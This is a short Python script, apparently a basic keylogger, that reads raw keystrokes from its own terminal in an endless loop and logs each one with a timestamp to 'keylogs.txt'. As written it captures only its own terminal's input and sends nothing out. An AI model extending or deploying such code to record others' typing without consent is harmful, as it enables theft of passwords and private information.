import sys
import termios
import tty
import datetime
import logging

logging.basicConfig(filename='keylogs.txt', level=logging.INFO)

def read_key():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

while True:
    key = read_key()
    logging.info(f"{datetime.datetime.now()} - {key}")
